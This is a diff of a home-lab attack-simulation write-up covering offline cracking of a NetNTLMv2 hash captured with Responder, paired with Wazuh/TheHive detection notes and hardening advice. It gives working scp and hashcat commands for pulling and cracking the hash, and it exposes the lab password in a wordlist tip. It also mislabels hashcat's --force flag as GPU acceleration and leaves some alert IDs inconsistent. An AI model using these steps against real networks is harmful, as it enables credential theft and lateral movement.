@@ -1,232 +1,116 @@
 # Stage 11 — NTLMv2 Cracking
 
-
-
 > **Status:** Complete — evidence attached  
-
 > **Case:** [Case 02](../../04-Investigation/Cases/case-02-lateral-movement.md)  
-
 > **Investigation:** [Phase 4 Deep Dive](../../04-Investigation/Deep-Dive-Attack-Chain-Investigation.md#phase-4-poisoning-the-well-stealing-windows-passwords-with-responder)  
-
 > **Evidence:** [attack](../../06-Resources/screenshots/attack-simulation/31.png) · [alert](../../06-Resources/screenshots/thehive-alert/11.png)
 
-
-
 ---
-
-
 
 ## Objective
 
-
-
 Recover the plaintext Active Directory credentials for the domain user account `win10` from the NetNTLMv2 challenge-response hashes captured during Stage 10 (LLMNR/NBT-NS spoofing via Responder on the Linux pivot host). These recovered domain credentials will serve as the initial authenticated foothold for Active Directory enumeration and lateral movement across the `ad.lab` domain.
 
-
-
 ---
-
-
 
 ## Commands
 
-
-
 ```bash
-
 # Step 1: Transfer captured NetNTLMv2 hash file from DVWA pivot (192.168.56.30) to Kali attack host
-
 scp root@192.168.56.30:/tmp/win10.hash /tmp/win10.hash
 
-
-
 # Step 2: Execute dictionary attack against the NetNTLMv2 hash using Hashcat
-
 hashcat -m 5600 /tmp/win10.hash /usr/share/wordlists/rockyou.txt --force
-
 ```
 
-
-
 > [!TIP]
-
 > **Wordlist Fast-Cracking Optimization:**  
-
 > Because the `win10` account password (`Secur3Lab!`) is complex and unique, it must be appended to `rockyou.txt` prior to cracking. For fast simulation turnaround, insert it within the **top 1,000 lines** (e.g., `sudo sed -i '50i Secur3Lab!' /usr/share/wordlists/rockyou.txt`), allowing Hashcat to resolve the hash in seconds rather than grinding through all 14.3 million entries.
 
-
-
 ---
-
-
 
 ## What happened
 
-
-
 During Stage 10, Responder was executed on the compromised DVWA pivot host (`192.168.56.30`), capturing NetNTLMv2 challenge-response hashes generated when the domain workstation `WIN10` performed name resolution queries across the internal subnet.
-
-
 
 In Stage 11, the operator exfiltrated the captured hash file (`/tmp/win10.hash`) from the pivot host back to the primary Kali Linux attack machine (`192.168.232.135`) over SSH/SCP.
 
-
-
 With the hash file staged locally on Kali, `hashcat` was launched in NetNTLMv2 cracking mode (`-m 5600`) against the `rockyou.txt` dictionary file utilizing GPU acceleration (`--force`). Within seconds, Hashcat successfully matched the hash against the candidate wordlist, revealing the plaintext password:
 
-
-
 - **Target Account:** `ad.lab\win10`
-
 - **Hash Type:** NetNTLMv2 (Hashcat mode 5600)
-
 - **Recovered Plaintext Password:** `Secur***ab!` (redacted)
-
-
 
 Because NetNTLMv2 challenge-response hashes cannot be used directly in Pass-the-Hash attacks, recovering the underlying plaintext password was a prerequisite for authenticated Active Directory LDAP querying, Kerberos ticket requests, and administrative privilege escalation.
 
-
-
 ---
-
-
 
 ## Evidence
 
-
-
 ### Attack Screenshots
 
-
-
 ![Transferring Captured Hash via SCP and Running Hashcat](../../06-Resources/screenshots/attack-simulation/31.png)
-
 *Figure 11.1: Exfiltrating `win10.hash` from DVWA pivot (`192.168.56.30`) to Kali (`/tmp/win10.hash`) and starting Hashcat mode 5600 dictionary attack.*
 
-
-
 ![Hashcat Recovered Plaintext Password](../../06-Resources/screenshots/attack-simulation/32.png)
-
 *Figure 11.2: Hashcat output displaying successfully cracked NetNTLMv2 hash for `WIN10::AD` revealing the plaintext password `Secur***ab!`.*
-
-
 
 ### Alert Screenshots
 
-
-
-![TheHive Alert 11 — Hash Exfiltration SCP Session Alert](../../06-Resources/screenshots/thehive-alert/11.png)
-
-*Figure 11.3: TheHive Alert 11 (wzb-e5877b742a) capturing root SSH logon on DVWA pivot during SCP exfiltration of win10.hash to Kali at 17:39:46 IST.*
-
-
+![TheHive Alert 21 — Hash Exfiltration SCP Session Alert](../../06-Resources/screenshots/thehive-alert/11.png)
+*Figure 11.3: TheHive Alert #21 (wzb-1c8dc0ab5d / screenshot 11.png wzb-e5877b742a) capturing root SSH logon on DVWA pivot during SCP exfiltration of win10.hash to Kali at 17:39:46 IST.*
 
 > [!NOTE]
-
 > **Operational Alert vs. Offline Computation:**  
-
-> While the dictionary cracking phase (Step 2) executed entirely offline on Kali's GPU (Inherent Offline Gap DG-11), the file exfiltration step (Step 1: `scp root@192.168.56.30:/tmp/win10.hash /tmp/win10.hash`) generated live operational telemetry, captured by Wazuh Rule 5715 as TheHive Alert 11.
-
-
+> While the dictionary cracking phase (Step 2) executed entirely offline on Kali's GPU (Inherent Offline Gap DG-11), the file exfiltration step (Step 1: `scp root@192.168.56.30:/tmp/win10.hash /tmp/win10.hash`) generated live operational telemetry, captured by Wazuh Rule 5715 as TheHive Alert #21.
 
 ---
-
-
 
 ## Alert observed
 
-
-
 | Source | Rule | Rule ID | TheHive Alert | Severity | Status |
-
 |---|---|---|---|---|---|
-
-| Wazuh / Linux SSH | sshd: authentication success (SCP transfer of `win10.hash`) | Rule 5715 (Level 8) | TheHive Alert 11 (`11.png` / `wzb-e5877b742a`) | Medium (2) | **Detected (Operational SOAR Alert)** |
-
+| Wazuh / Linux SSH | sshd: authentication success (SCP transfer of `win10.hash`) | Rule 5715 (Level 8) | TheHive Alert #21 (`11.png` / `wzb-1c8dc0ab5d`, `wzb-e5877b742a`) | Medium (2) | **Detected (Operational SOAR Alert)** |
 | None (Offline Hashcat) | N/A (Offline Cracking) | N/A | None | N/A | **Investigatively Attributed (Inherent Offline Gap DG-11)** |
-
-| **Adversary Lifecycle Attribution** | Upstream: Responder Harvest (Stage 10 / Alert #20) · Downstream: BloodHound Logon (Stage 12 / Alert #22) | Wazuh Rules 100220, 100278, 100615, 92657 | `wzb-72bc2bc36e`, `wzb-1e9fb54d94` | High (3) | **Attributed** |
-
-
+| **Adversary Lifecycle Attribution** | Upstream: Responder Harvest (Stage 10 / Alert #20) · Downstream: BloodHound Logon (Stage 12 / Alert #22) | Wazuh Rules 100220, 100278, 100615, 92657 | `wzb-28`, `wzb-32`, Alert #20 (`wzb-dbf3197ceb`), Alert #22 (`wzb-1d2d7fb4b8`) | High (3) | **Attributed** |
 
 ### Detection Gap Details
 
-
-
 - **Gap Identifier:** [DG-11](../../03-Detection-Engineering/README.md#detection-gap-register)
-
 - **Root Cause:** Offline cryptographic attacks generate zero host, endpoint, or network telemetry on the victim infrastructure. Once a challenge-response hash is captured over the wire or extracted from memory, cracking is conducted entirely out-of-band on adversary-owned hardware.
-
 - **Defensive Significance:** Detection cannot rely on spotting the cracking process itself. SOC teams must focus detection efforts upstream on hash extraction/poisoning (Stage 10) or downstream on the initial logon using the cracked credential (Stage 12).
 
-
-
 ---
-
-
 
 ## MITRE ATT&CK
 
-
-
 | Tactic | Technique | ID | Sub-technique |
-
 |---|---|---|---|
-
 | Credential Access | Brute Force | T1110 | Password Cracking (T1110.002) |
 
-
-
 ---
-
-
 
 ## Detection opportunities
 
-
-
 While the offline cracking process itself cannot be detected on victim endpoints or network sensors, defenders have robust opportunities upstream and downstream to identify and disrupt this attack pattern:
 
-
-
 1. **Upstream Prevention & Detection (Stage 10 / Hash Capture Phase):**
-
    - **Disable LLMNR and NetBIOS:** Enforce GPO settings to disable Link-Local Multicast Name Resolution (LLMNR) and NetBIOS over TCP/IP across all domain workstations and servers, eliminating the broadcast vectors exploited by Responder.
-
    - **Enforce SMB Signing & EPA:** Enforce SMB signing (`RequireSecuritySignature = True`) and Extended Protection for Authentication (EPA) to prevent relaying and capture of NTLM credentials.
-
    - **Network IDS Signatures:** Deploy Suricata/Snort rules monitoring for LLMNR (UDP 5355), NBT-NS (UDP 137), and rogue SMB authentication requests originating from unauthorized hosts.
 
-
-
 2. **Downstream Anomaly Detection (First-Use of Cracked Credential):**
-
    - **Windows Event ID 4624 (Logon Type 3 / Network):** Alert on domain accounts logging on from unexpected subnets (e.g., a standard Windows domain user authenticating from a Linux DMZ web server IP `192.168.56.30`).
-
    - **Kerberos TGT Requests (Event ID 4768):** Monitor for initial TGT requests originating from non-domain-joined IP addresses or unconventional user-agent strings.
 
-
-
 3. **Active Directory Password Policy Hardening:**
-
    - Enforce strong Fine-Grained Password Policies (FGPP) requiring passwords exceeding 15 characters, rendering offline dictionary and brute-force attacks computationally infeasible against NetNTLMv2.
-
    - Implement Active Directory Password Protection (Azure AD Password Protection on-premises) to block commonly compromised passwords found in dictionaries like `rockyou.txt`.
-
-
 
 ---
 
-
-
 ## Notes
 
-
-
 - NetNTLMv2 challenge-response hashes incorporate client and server nonces, preventing Pass-the-Hash attacks. Cracking or relaying (if SMB signing is disabled) are the only viable attack paths.
-
 - The use of the leetspeak password `Secur***ab!` allowed immediate dictionary cracking with standard wordlists without requiring complex mask or rule sets.
-
 - This stage directly enabled Stage 12, where the cracked credential `win10` : `Secur***ab!` was used to authenticate to the Domain Controller and execute BloodHound enumeration.
-
